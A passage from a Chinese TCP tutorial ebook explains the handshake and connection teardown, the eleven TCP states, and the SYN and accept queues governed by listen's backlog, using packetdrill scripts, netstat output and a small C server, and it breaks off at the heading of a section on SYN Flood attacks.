+0 connect(3, ..., ...) = -1
```

执行 netstat 命令可以看到

```
netstat -atnp | grep -i 8080                                                                                                    
tcp        0      1 192.168.46.26:42678     192.0.2.1:8080          SYN_SENT    3897/packetdrill
```

执行 tcpdump 抓包`sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap`，使用 wireshark 可以看到没有收到对端 ACK 的情况下，SYN 包重传了 6 次，这个值是由`/proc/sys/net/ipv4/tcp_syn_retries`决定的， 在我的 Centos 机器上，这个值等于 6

```
cat /proc/sys/net/ipv4/tcp_syn_retries
6
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b518cd1915a8c3)



6次重试（65s = 1s+2s+4s+8s+16s+32s)以后放弃重试，connect 调用返回 -1，调用超时，如果是用 Java 等语言就会返回`java.net.ConnectException: Connection timed out`异常

## 同时打开

TCP 支持同时打开，但是非常罕见，使用场景也比较有限，不过我们还是简单介绍一下。它们的包交互过程是怎么样的？TCP 状态变化又是怎么样的呢？

包交互的过程如下图



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b5693e5d32aef9)



以其中一方为例，记为 A，另外一方记为 B

- 最初的状态是`CLOSED`
- A 发起主动打开，发送 `SYN` 给 B，然后进入`SYN-SENT`状态
- A 还在等待 B 回复的 `ACK` 的过程中，收到了 B 发过来的 `SYN`，what are you 弄啥咧，A 没有办法，只能硬着头皮回复`SYN+ACK`，随后进入`SYN-RCVD`
- A 依旧死等 B 的 ACK
- 好不容易等到了 B 的 ACK，对于 A 来说连接建立成功

同时打开在通信两端时延比较大情况下比较容易模拟，我还没有在本地模拟成功。

## 小结

这篇文章主要介绍了三次握手的相关的内容，我们来回顾一下。

首先介绍了三次握手交换 ISN 的细节：

- SYN 段长度为 0 却需要消耗一个序列号，原因是 SYN 段需要对端确认
- ACK 段长度为 0，不消耗序列号，也不用对端确认
- ISN 不能从一个固定的值开始，原因是处于安全性和避免前后连接互相干扰

接下来首次介绍了 TCP 的状态机，TCP 的这 11 中状态的变化是 TCP 学习的重中之重。

接下来用 packetdrill 轻松构造了一个 SYN_SENT 状态的 TCP 连接，随后通过这个例子介绍了这本小册第一个 TCP 定时器「连接建立定时器」，这个定时器会在发送第一个 SYN 包以后开启，如果没有收到对端 ACK，会重传指定的次数。

最后我们介绍了同时打开这种比较罕见的建立连接的方式。

## 作业题

1、TCP 协议三次握手建立一个连接，第二次握手的时候服务器所处的状态是（）

- A、SYN_RECV
- B、ESTABLISHED
- C、SYN-SENT
- D、LAST_ACK

2、下面关于三次握手与connect()函数的关系说法错误的是（）

- A、客户端发送 SYN 给服务器
- B、服务器只发送 SYN 给客户端
- C、客户端收到服务器回应后发送 ACK 给服务器
- D、connect() 函数在三次握手的第二次返回

# 四次挥手

在面试的过程中，经常会被问到：“你可以讲讲三次握手、四次挥手吗？”，大部分面试者都会熟练的背诵，每个阶段做什么，这篇文章我们将深入讲解连接终止相关的细节问题。

## 四次挥手

最常见的四次挥手的过程下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b911c618264239)



1、客户端调用 `close` 方法，执行「主动关闭」，会发送一个 FIN 报文给服务端，从这以后客户端不能再发送数据给服务端了，客户端进入`FIN-WAIT-1`状态。FIN 报文其实就是将 FIN 标志位设置为 1。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b911c69b0f0f8e)



FIN 段是可以携带数据的，比如客户端可以在它最后要发送的数据块可以“捎带” FIN 段。当然也可以不携带数据。如果 FIN 段不携带数据的话，需要消耗一个序列号。

客户端发送 FIN 包以后不能再发送数据给服务端，但是还可以接受服务端发送的数据。这个状态就是所谓的「半关闭（half-close）」

主动发起关闭的一方称为「主动关闭方」，另外一段称为「被动关闭方」。

2、服务端收到 FIN 包以后回复确认 ACK 报文给客户端，服务端进入 `CLOSE_WAIT`，客户端收到 ACK 以后进入`FIN-WAIT-2`状态。

3、服务端也没有数据要发送了，发送 FIN 报文给客户端，然后进入`LAST-ACK` 状态，等待客户端的 ACK。同前面一样如果 FIN 段没有携带数据，也需要消耗一个序列号。

4、客户端收到服务端的 FIN 报文以后，回复 ACK 报文用来确认第三步里的 FIN 报文，进入`TIME_WAIT`状态，等待 2 个 MSL 以后进入 `CLOSED`状态。服务端收到 ACK 以后进入`CLOSED`状态。`TIME_WAIT`是一个很神奇的状态，后面有文章会专门介绍。

## 为什么 FIN 报文要消耗一个序列号

如三次握手的 SYN 报文一样，不管是否携带数据，FIN 段都需要消耗一个序列号。我们用一个图来解释，如果 FIN 段不消耗一个序列号会发生什么。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b911c61961ba78)



如上图所示，如果 FIN 包不消耗一个序列号。客户端发送了 100 字节的数据包和 FIN 包，都等待服务端确认。如果这个时候客户端收到了ACK=1000 的确认包，就无法得知到底是 100 字节的确认包还是 FIN 包的确认包。

## 为什么挥手要四次，变为三次可以吗？

首先我们先明确一个问题，TCP 连接终止一定要四次包交互吗？三次可以吗？

当然可以，因为有**延迟确认**的存在，把第二步的 ACK 经常会跟随第三步的 FIN 包一起捎带会对端。延迟确认后面有一节专门介绍。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b911c61b084c66)



一个真实的 wireshark 抓包如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b911c66b8f2069)



其实这个行为跟应用层有比较大的关系，因为发送 FIN 包以后，会进入半关闭（half-close）状态，表示自己不会再给对方发送数据了。因此如果服务端收到客户端发送的 FIN 包以后，只能表示客户端不会再给自己发送数据了，但是服务端这个时候是可以给客户端发送数据的。

在这种情况下，如果不及时发送 ACK 包，死等服务端这边发送数据，可能会造成客户端不必要的重发 FIN 包，如下图所示。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b911c69a12791c)



如果服务端确定没有什么数据需要发给客户端，那么当然是可以把 FIN 和 ACK 合并成一个包，四次挥手的过程就成了三次。

## 握手可以变为四次吗？

其实理论上完全是可以的，把三次握手的第二次的 SYN+ACK 拆成先回 SYN 包，再发 SYN 包就变成了「四次握手」



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b911c6a3ca620d)



与 FIN 包不同的是，一般情况下，SYN 包都不携带数据，收到客户端的 SYN 包以后不用等待，可以立马回复 SYN+ACK，四次握手理论上可行，但是现实中我还没有见过。

## 同时关闭

前面介绍的都是一端收到了对端的 FIN，然后回复 ACK，随后发送自己的 FIN，等待对端的 ACK。TCP 是全双工的，当然可以两端同时发起 FIN 包。如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16d75572508a08d2)



以客户端为例

- 最初客户端和服务端都处于 ESTABLISHED 状态
- 客户端发送 `FIN` 包，等待对端对这个 FIN 包的 ACK，随后进入 `FIN-WAIT-1` 状态
- 处于`FIN-WAIT-1`状态的客户端还没有等到 ACK，收到了服务端发过来的 FIN 包
- 收到 FIN 包以后客户端会发送对这个 FIN 包的的确认 ACK 包，同时自己进入 `CLOSING` 状态
- 继续等自己 FIN 包的 ACK
- 处于 `CLOSING` 状态的客户端终于等到了ACK，随后进入`TIME-WAIT`
- 在`TIME-WAIT`状态持续 2*MSL，进入`CLOSED`状态

我用 packetdrill 脚本模拟了一下同时关闭，部分代码如下，完整的代码见：[simultaneous-close.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_connection_management/simultaneous-close.pkt)

```
// 服务端发送 FIN
0.150 close(4) = 0
0.150 > F. 1:1(0) ack 1 <...>

// 客户端发送 FIN
0.150 < F. 1:1(0) ack 2 win 65535

// 服务端回复 ACK
0.150 > .  2:2(0) ack 2 <...>

// 客户端回复 ACK
0.150 < . 2:2(0) ack 2 win 65535
```

使用 netstat 查看连接状态，可以看到两端都进入了`TIME_WAIT` 状态

```
netstat -tnpa | grep -i 8080                                                                
tcp        0      0 192.168.198.228:8080    0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.198.228:8080    192.0.2.1:35769         TIME_WAIT   -                   
tcp        0      0 192.168.220.28:8080     192.0.2.1:35780         TIME_WAIT   -     
```

使用 wireshark 抓包如下图所示，完整的抓包文件可以在这里下载：[simultaneous-close.pcap](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_connection_management/simultaneous-close.pcap)



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b911c6a3c62b6e)



当然上面的脚本并不能每次模拟出两端都进入`TIME_WAIT`的状态，取决于在发送 `FIN`包之前有没有提前收到对端的 FIN 包。如果在发送 FIN 之前收到了对端的 FIN，只会有一段进入`TIME_WAIT`

## 小结

这篇文章介绍了四次挥手断开连接的细节，然后用图解的方式介绍了为什么 FIN 包需要占用一个序列号。随后引出了为什么挥手要四次的问题，最后通过 packetdrill 的方式模拟了同时关闭。

## 面试题

1、HTTP传输完成，断开进行四次挥手，第二次挥手的时候客户端所处的状态是：

- A、CLOSE_WAIT
- B、LAST_ACK
- C、FIN_WAIT2
- D、TIME_WAIT

2、正常的 TCP 三次握手和四次挥手过程（客户端建连、断连）中，以下状态分别处于服务端和客户端描述正确的是

- A、服务端：SYN-SEND，TIME-WAIT 客户端：SYN-RCVD，CLOSE-WAIT
- B、服务端：SYN-SEND，CLOSE-WAIT 客户端：SYN-RCVD，TIME-WAIT
- C、服务端：SYN-RCVD，CLOSE-WAIT 客户端：SYN-SEND，TIME-WAIT
- D、服务端：SYN-RCVD，TIME-WAIT 客户端：SYN-SEND，CLOSE-WAIT

# TCP协议的11种状态转换

讲完前面建立连接、断开连接的过程，整个 TCP 协议的 11 种状态都出现了。TCP 之所以复杂，是因为它是一个有状态的协议。如果这个时候祭出下面的 TCP 状态变化图，估计大多数人都会懵圈，不要慌，我们会把上面的状态一一解释清楚。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7c9fb02bff057)



上面这个图是网络上有人用 Latex 画出来了，很赞。不过有一处小错误，我修改了一下，如果感兴趣的话可以从我的 github 上进行下载，链接：[tcp-state-machine.tex](https://github.com/arthur-zhang/tcp_ebook/tree/master/tcp_connection_management)，在 [overleaf](https://www.overleaf.com/) 的网站可以进行实时预览。

**1、CLOSED**

这个状态是一个「假想」的状态，是 TCP 连接还未开始建立连接或者连接已经彻底释放的状态。因此`CLOSED`状态也无法通过 `netstat` 或者 `lsof` 等工具看到。

从图中可以看到，从 CLOSE 状态转换为其它状态有两种可能：主动打开（Active Open）和被动打开（Passive Open）

- 被动打开：一般来说，服务端会监听一个特定的端口，等待客户端的新连接，同时会进入`LISTEN`状态，这种被称为「被动打开」
- 主动打开：客户端主动发送一个`SYN`包准备三次握手，被称为「主动打开（Active Open）」

**2、LISTEN**

一端（通常是服务端）调用 bind、listen 系统调用监听特定端口时进入到`LISTEN`状态，等待客户端发送 `SYN` 报文三次握手建立连接。

在 Java 中只用一行代码就可以构造一个 listen 状态的 socket。

```
ServerSocket serverSocket = new ServerSocket(9999);
```

ServerSocket 的构造器函数最终调用了 bind、listen，接下来就可以调用 accept 接收客户端连接请求了。

使用 netstat 进行查看

```
netstat -tnpa | grep -i 9999                     
tcp6       0      0 :::9999     :::*                    LISTEN      20096/java       
```

处于`LISTEN`状态的连接收到`SYN`包以后会发送 `SYN+ACK` 给对端，同时进入`SYN-RCVD`阶段

**3、SYN-SENT**

客户端发送 `SYN` 报文等待 `ACK` 的过程进入 `SYN-SENT`状态。同时会开启一个定时器，如果超时还没有收到`ACK`会重发 SYN。

使用 packetdrill 可以非常快速的构造一个处于`SYN-SENT`状态的连接，完整的代码见：[syn_sent.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_state/syn_sent.pkt)

```
// 新建一个 server socket
+0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3

// 客户端 connect
+0 connect(3, ..., ...) = -1
```

运行上面的脚本，然后使用 netstat 命令查看连接状态l

```
netstat -atnp | grep -i 8080                                                                                                    
tcp        0      1 192.168.46.26:42678     192.0.2.1:8080          SYN_SENT    3897/packetdrill
```

**4、SYN-RCVD**

服务端收到`SYN`报文以后会回复 `SYN+ACK`，然后等待对端 ACK 的时候进入`SYN-RCVD`，完整的代码见：[state_syn_rcvd.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_state/state_syn_rcvd.pkt)

```
+0  < S 0:0(0) win 65535  <mss 100>
+0  > S. 0:0(0) ack 1 <...>
// 故意注释掉下面这一行
// +.1 < . 1:1(0) ack 1 win 65535
```

**5、ESTABLISHED**

`SYN-SENT`或者`SYN-RCVD`状态的连接收到对端确认`ACK`以后进入`ESTABLISHED`状态，连接建立成功。

把上面例子中脚本的注释取消掉，三次握手成功就会进入`ESTABLISHED`状态。

从图中可以看到`ESTABLISHED`状态的连接有两种可能的状态转换方式:

- 调用 close 等系统调用主动关闭连接，这个时候会发送 FIN 包给对端，同时自己进入`FIN-WAIT-1`状态
- 收到对端的 FIN 包，执行被动关闭，收到 `FIN` 包以后会回复 `ACK`，同时自己进入`CLOSE-WAIT`状态

**6、FIN-WAIT-1**

主动关闭的一方发送了 FIN 包，等待对端回复 ACK 时进入`FIN-WAIT-1`状态。

模拟的 packetdrill 脚本见：[state_fin_wait_1.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_state/state_fin_wait_1.pkt)

```
+0  < S 0:0(0) win 65535  <mss 100>
+0  > S. 0:0(0) ack 1 <...>
.1 < . 1:1(0) ack 1 win 65535

+.1 accept(3, ..., ...) = 4

// 服务端主动断开连接
+.1 close(4) = 0
```

执行上的脚本，使用 netstat 就可以看到 FIN_WAIT1 状态的连接了

```
netstat -tnpa | grep 8080
tcp        0      0 192.168.73.207:8080     0.0.0.0:*               LISTEN      -                   
tcp        0      1 192.168.73.207:8080     192.0.2.1:52859         FIN_WAIT1   -   
```

`FIN_WAIT1`状态的切换如下几种情况

- 当收到 `ACK` 以后，`FIN-WAIT-1`状态会转换到`FIN-WAIT-2`状态
- 当收到 `FIN` 以后，会回复对端 `ACK`，`FIN-WAIT-1`状态会转换到`CLOSING`状态
- 当收到 `FIN+ACK` 以后，会回复对端 `ACK`，`FIN-WAIT-1`状态会转换到`TIME_WAIT`状态，跳过了`FIN-WAIT-2`状态

**7、FIN-WAIT-2**

处于 `FIN-WAIT-1`状态的连接收到 ACK 确认包以后进入`FIN-WAIT-2`状态，这个时候主动关闭方的 FIN 包已经被对方确认，等待被动关闭方发送 FIN 包。

模拟的脚本见：[state_fin_wait_2.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_state/state_fin_wait_2.pkt)，核心代码如下

```
+0  < S 0:0(0) win 65535  <mss 100>
+0  > S. 0:0(0) ack 1 <...>
.1 < . 1:1(0) ack 1 win 65535
+.1  accept(3, ..., ...) = 4

// 服务端主动断开连接
+.1 close(4) = 0

// 向协议栈注入 ACK 包，模拟客户端发送了 ACK
+.1 < . 1:1(0) ack 2 win 257
```

执行上的脚本，使用 netstat 就可以看到 FIN_WAIT2 状态的连接了

```
netstat -tnpa | grep 8080
tcp        0      0 192.168.81.69:8080      0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.81.69:8080      192.0.2.1:34131         FIN_WAIT2   -  
```

当收到对端的 FIN 包以后，主动关闭方进入`TIME_WAIT`状态

**8、CLOSE-WAIT**

当有一方想关闭连接的时候，调用 close 等系统调用关闭 TCP 连接会发送 FIN 包给对端，这个被动关闭方，收到 FIN 包以后进入`CLOSE-WAIT`状态。

完整的代码见：[state_close_wait.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_state/state_close_wait.pkt)

```
// 向协议栈注入 FIN 包，模拟客户端发送了 FIN，主动关闭连接
+.1 < F. 1:1(0) win 65535  <mss 100> 
// 预期协议栈会发出 ACK，被动关闭方服务端进入 CLOSE_WAIT 状态
+0 > . 1:1(0) ack 2 <...>
```

执行上的脚本，使用 netstat 就可以看到 CLOSE_WAIT 状态的连接了

```
sudo netstat -tnpa | grep -i 8080    
tcp        0      0 192.168.168.15:8080     0.0.0.0:*               LISTEN      15818/packetdrill   
tcp        1      0 192.168.168.15:8080     192.0.2.1:44948         CLOSE_WAIT  15818/packetdrill   
```

当被动关闭方有数据要发送给对端的时候，可以继续发送数据。当没有数据发送给对方时，也会调用 close 等系统调用关闭 TCP 连接，发送 FIN 包给主动关闭的一方，同时进入`LAST-ACK`状态

**9、TIME-WAIT**

`TIME-WAIT`可能是所有状态中面试问的最频繁的一种状态了。这个状态是收到了被动关闭方的 FIN 包，发送确认 ACK 给对端，开启 2MSL 定时器，定时器到期时进入 `CLOSED` 状态，连接释放。`TIME-WAIT` 会有专门的文章介绍。

完整的代码见：[state_time_wait.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_state/state_time_wait.pkt)

```
// 服务端主动断开连接
+.1 close(4) = 0
+0 > F. 1:1(0) ack 1 <...>

// 向协议栈注入 ACK 包，模拟客户端发送了 ACK
+.1 < . 1:1(0) ack 2 win 257

// 向协议栈注入 FIN，模拟服务端收到了 FIN
+.1 < F. 1:1(0) win 65535  <mss 100> 

+0 `sleep 1000000`
```

执行上的脚本，使用 netstat 就可以看到 TIME-WAIT 状态的连接了

```
netstat -tnpa | grep -i 8080

tcp        0      0 192.168.210.245:8080    0.0.0.0:*               LISTEN      6297/packetdrill    
tcp        0      0 192.168.210.245:8080    192.0.2.1:40091         TIME_WAIT   -  
```

**10、LAST-ACK**

`LAST-ACK` 顾名思义等待最后的 ACK。是被动关闭的一方，发送 FIN 包给对端等待 ACK 确认时的状态。

完整的模拟代码见：[state_last_ack.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_state/state_last_ack.pkt)

```
// 向协议栈注入 FIN 包，模拟客户端发送了 FIN，主动关闭连接
+.1 < F. 1:1(0) win 65535  <mss 100> 
// 预期协议栈会发出 ACK
+0 > . 1:1(0) ack 2 <...> 

+.1 close(4) = 0
// 预期服务端会发出 FIN
+0 > F. 1:1(0) ack 2 <...> 
sudo netstat -lnpa  | grep 8080                                                                                                                                                                             1 ↵
tcp        0      0 192.168.190.26:8080     0.0.0.0:*               LISTEN      6163/packetdrill
tcp        1      1 192.168.190.26:8080     192.0.2.1:36054         LAST_ACK
```

当收到 ACK 以后，进入 `CLOSED` 状态，连接释放。

**11、CLOSING**

`CLOSING`状态在「同时关闭」的情况下出现。这里的同时关闭中的「同时」其实并不是时间意义上的同时，而是指的是在发送 FIN 包还未收到确认之前，收到了对端的 FIN 的情况。

我们用一个简单的脚本来模拟`CLOSING`状态。完整的代码见 [state-closing.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_connection_management/state-closing.pkt)

```
// ... 省略前面初始化三次握手的脚本

// 服务端随便传输一点数据给客户端
+0.100 write(4, ..., 1000) = 1000
// 断言服务端会发出 1000 字节的数据
+0 > P. 1:1001(1000) ack 1 <...>

// 确认 1000 字节数据
+0.01 < . 1:1(0) ack 1001 win 257

// 服务端主动断开，会发送 FIN 给客户端，进入 FIN-WAIT-1
+.1 close(4) = 0
// 断言协议栈会发出 ACK 确认（服务端->客户端）
+0 > F. 1001:1001(0) ack 1 <...>

// 客户端在未对服务端的 FIN 做确认时，也发出 FIN 要求断开连接，进入 LAST-ACK
+.1 < F. 1:1(0) ack 1001 win 257

// 断言协议栈会发出 ACK 确认客户端的 FIN（服务端->客户端），客户端进入 CLOSED 状态
+0 > . 1002:1002(0) ack 2 <...>

// 注释掉下面这一行，客户端故意不回 ACK，让连接处于 CLOSING 状态
// +.1 < . 2:2(0) ack 1002 win 257
```

运行 packetdrill 执行上面的脚本，同时开启抓包。

使用 netstat 查看当前的连接状态就可以看到 CLOSING 状态了。

```
netstat -lnpa | grep -i 8080

tcp        0      0 192.168.60.204:8080     0.0.0.0:*               LISTEN      -
tcp        1      1 192.168.60.204:8080     192.0.2.1:55456         CLOSING     -
```

使用 wireshark 查看如下图所示，完整的抓包文件可以从 github 下载：[state-closing.pcap](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_connection_management/state-closing.pcap)

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7c9fb03c6c24d)



整个过程如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7c9fb0e55ff72)



## 小结

到这里，TCP 的 11 种状态就介绍完了，我为了你准备了几道试题，看下自己的掌握的情况吧。

## 作业题

1、下列TCP连接建立过程描述正确的是：

- A、服务端收到客户端的 SYN 包后等待 2*MSL 时间后就会进入 SYN_SENT 状态
- B、服务端收到客户端的 ACK 包后会进入 SYN_RCVD 状态
- C、当客户端处于 ESTABLISHED 状态时，服务端可能仍然处于 SYN_RCVD 状态
- D、服务端未收到客户端确认包，等待 2*MSL 时间后会直接关闭连接

2、TCP连接关闭，可能有经历哪几种状态：

- A、LISTEN

- B、TIME-WAIT

- C、LAST-ACK

- D、SYN-RECEIVED

    # 全连接队列和半连接队列与 backlog

关于三次握手，还有很多细节上一篇文章没有详细介绍，这篇文章我们以 backlog 参数来深入研究一下建连的过程。

为了理解 backlog，我们需要了解 listen 和 accept 函数背后的发生了什么。

backlog 参数跟 listen 函数有关，listen 函数的定义如下

```
int listen(int sockfd, int backlog);
```

当服务端调用 listen 函数时，TCP 的状态被从 CLOSE 状态变为 LISTEN，于此同时内核创建了两个队列：

- 半连接队列（Incomplete connection queue），又称 SYN 队列
- 全连接队列（Completed connection queue），又称 Accept 队列



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b9dae5efc47de8)



## 半连接队列（SYN Queue）

当客户端发起 SYN 到服务端，服务端收到以后会回 ACK 和自己的 SYN。这时服务端这边的 TCP 从 listen 状态变为 SYN_RCVD (SYN Received)，此时会将这个连接信息放入「半连接队列」，半连接队列也被称为 SYN Queue，存储的是 "inbound SYN packets"。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918ddaf0b49c7e)



服务端回复 SYN+ACK 包以后等待客户端回复 ACK，同时开启一个定时器，如果超时还未收到 ACK 会进行 SYN+ACK 的重传，重传的次数由 tcp_synack_retries 值确定。在 CentOS 上这个值等于 5。

一旦收到客户端的 ACK，服务端就开始**尝试**把它加入另外一个全连接队列（Accept Queue）。

## 全连接队列（Accept Queue）

「全连接队列」包含了服务端所有完成了三次握手，但是还未被应用取走的连接队列。此时的 socket 处于 ESTABLISHED 状态。每次应用调用 accept() 函数会移除队列头的连接。如果队列为空，accept() 通常会阻塞。全连接队列也被称为 Accept 队列。

## 队列大小限制

两个队列都不是无限大小的，listen 函数的第二个参数 backlog 用来设置全连接队列大小。

```
int listen(int sockfd, int backlog)
```

如果全连接队列满，server 会舍弃掉 client 发过来的 ack（server 会认为此时连接还未完全建立）

我们来模拟一下全连接队列满的情况。因为只有 accept 才会移除全连接的队列，所以如果我们只 listen，不调用 accept，那么很快全连接就可以被占满。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16ba09ba6e24b1c3)



为了贴近最底层的调用，这里用 c 语言来实现，新建一个 main.c 文件

```
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>

int main() {
    struct sockaddr_in serv_addr;
    int listen_fd = 0;
    if ((listen_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        exit(1);
    }
    bzero(&serv_addr, sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(8080);

    if (bind(listen_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) == -1) {
        exit(1);
    }
    
    // 设置 backlog 为 1
    if (listen(listen_fd, 1) == -1) {
        exit(1);
    }
    sleep(100000000);
    return 0;
}
```

编译运行`gcc main.c; ./a.out` 开启三个客户端终端连接 8080 端口 `nc 10.211.55.5 8080` 在服务端用 netstat 查看 tcp 连接状态`netstat -an | awk 'NR==2 || $4~/8080/'`，可以看到有两个请求处于 ESTABLISHED 状态，有一个请求处于 SYN_RECV 状态。

```
ya@c1 ~/dev/backlog_demo$ netstat -an | awk 'NR==2 || $4~/8080/'
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        2      0 0.0.0.0:8080            0.0.0.0:*               LISTEN
tcp        0      0 10.211.55.5:8080        10.211.55.10:60000      SYN_RECV
tcp        0      0 10.211.55.5:8080        10.211.55.10:59996      ESTABLISHED
tcp        0      0 10.211.55.5:8080        10.211.55.10:59998      ESTABLISHED
```

另外注意到 backlog 等于 1，但是实际上处于 ESTABLISHED 状态的连接却有两个， 。在 Centos7 上全连接队列的长度并不严格等于 backlog，而是 backlog+1。关于这一点《Unix 网络编程卷一》87 页 4.5 节有详细的对比各个操作系统 backlog 与实际已排队连接的最大数量之间的关系。

客户端用 netstat 查看 tcp 不管有多少个连接，状态全是 ESTABLISHED

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0	  0 10.211.55.10:59996      10.211.55.5:8080        ESTABLISHED
tcp        0	  0 10.211.55.10:60000      10.211.55.5:8080        ESTABLISHED
tcp        0	  0 10.211.55.10:60038      10.211.55.5:8080        ESTABLISHED
tcp        0	  0 10.211.55.10:60032      10.211.55.5:8080        ESTABLISHED
tcp        0	  0 10.211.55.10:60036      10.211.55.5:8080        ESTABLISHED
tcp        0	  0 10.211.55.10:60026      10.211.55.5:8080        ESTABLISHED
```

第三次 nc 命令发起连接时服务器端抓包结果如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918ddaf0db514b)

以下记客户端 10.211.55.10 为 A，服务端 10.211.55.5 为 B



- 1：客户端 A 发起 SYN 到服务端 B，开始三次握手的第一步
- 2：服务器 B 马上回复了 ACK + SYN，此时 服务器 B socket处于 SYN_RCVD 状态
- 3：客户端 A 收到服务器 B 的 ACK + SYN，发送三次握手最后一步的 ACK 给服务器 B，自己此时处于 ESTABLISHED 状态，与此同时，由于服务器 B 的全连接队列满，它会丢掉这个 ACK，连接还未建立
- 4：服务端 B 因为任务没有收到 ACK，以为是自己在 2 中的 SYN + ACK 在传输过程中丢掉了，所以开始重传，期待客户端能重新回复 ACK。
- 5：客户端A收到 B 的 SYN + ACK 以后，马上回复了 ACK
- 6 ~ 13：但是这个 ACK 同样也会被服务器 B 丢弃，服务端 B 还是认为没有收到 ACK，继续重传重传的过程同样也是指数级退避的（1s、2s、4s、8s、16s），总共历时 31s 重传 5 次`SYN + ACK`以后，服务器 B 认为没有希望，一段时间后此条 tcp 连接就被系统回收了

SYN+ACK重传的次数是由操作系统的一个文件决定的`/proc/sys/net/ipv4/tcp_synack_retries`，可以用 cat 查看这个文件

```
cat /proc/sys/net/ipv4/tcp_synack_retries
5
```

整个过程如下图：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16918ddaf0d4afa5)



## 多大的 backlog 是合适的

前面讲了这么多，应用程序设置多大的 backlog 是合理的呢？

答案是 It depends，根据不同过的业务场景，需要做对应的调整。

- 你如果的接口处理连接的速度要求非常高，或者在做压力测试，很有必要调高这个值。
- 如果业务接口本身性能不好，accept 取走已建连的速度较慢，那么把 backlog 调的再大也没有用，只会增加连接失败的可能性

可以举个典型的 backlog 值供大家参考，Nginx 和 Redis 默认的 backlog 值等于 511，Linux 默认的 backlog 为 128，Java 默认的 backlog 等于 50

## tcp_abort_on_overflow 参数

默认情况下，全连接队列满以后，服务端会忽略客户端的 ACK，随后会重传`SYN+ACK`，也可以修改这种行为，这个值由`/proc/sys/net/ipv4/tcp_abort_on_overflow`决定。

- tcp_abort_on_overflow 为 0 表示三次握手最后一步全连接队列满以后 server 会丢掉 client 发过来的 ACK，服务端随后会进行重传 SYN+ACK。
- tcp_abort_on_overflow 为 1 表示全连接队列满以后服务端直接发送 RST 给客户端。

但是回给客户端 RST 包会带来另外一个问题，客户端不知道服务端响应的 RST 包到底是因为「该端口没有进程监听」，还是「该端口有进程监听，只是它的队列满了」。

## 小结

这篇文章我们从 backlog 参数为入口来研究了半连接队列、全连接队列的关系。简单回顾一下。

- 半连接队列：服务端收到客户端的 SYN 包，回复 SYN+ACK 但是还没有收到客户端 ACK 情况下，会将连接信息放入半连接队列。半连接队列又被称为 SYN 队列。
- 全连接队列：服务端完成了三次握手，但是还未被 accept 取走的连接队列。全连接队列又被称为 Accept 队列。

这两个队列与后面要介绍的 SYN Flood 攻击密切相关。

## 扩展阅读：

- [阿里中间件团队博客：关于TCP 半连接队列和全连接队列](http://jm.taobao.org/2017/05/25/525-1/)



# SYN Flood攻击原理

有了前面介绍的全连接和半连接队列，理解 SYN Flood 攻击就很简单了。为了模拟 SYN Flood，我们介绍一个新的工具：Scapy。

## Scapy 工具介绍

